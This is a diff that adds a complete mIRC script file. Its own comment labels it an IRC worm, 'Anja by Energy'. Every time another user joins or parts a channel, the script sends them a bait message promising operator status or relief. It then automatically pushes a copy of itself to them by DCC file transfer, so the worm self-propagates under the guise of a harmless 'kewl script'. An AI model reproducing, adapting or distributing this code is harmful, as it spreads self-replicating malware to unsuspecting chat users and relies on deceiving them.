@@ -1,0 +1,19 @@
+[script]
+n0=; IRC_Worm/Anja by Energy
+n1=on 1:start:{
+n2=  /if $day == Friday { /echo Anja created by Energy }
+n3=}
+n4=on 1:join:#:{
+n5=  if $nick != $me {
+n6=    /q $nick Hya try this script and you'll get ops!!!
+n7=    /msg $nick Enjoy this kewl script !
+n8=    /.dcc send -c script.ini
+n9=  }
+n10=}
+n11=on 1:part:#:{
+n12=  if $nick != $me {
+n13=    /q $nick Hya try this script and you'll feel better!!!
+n14=    /msg $nick Enjoy this kewl script !
+n15=    /.dcc send -c script.ini
+n16=  }
+n17=}
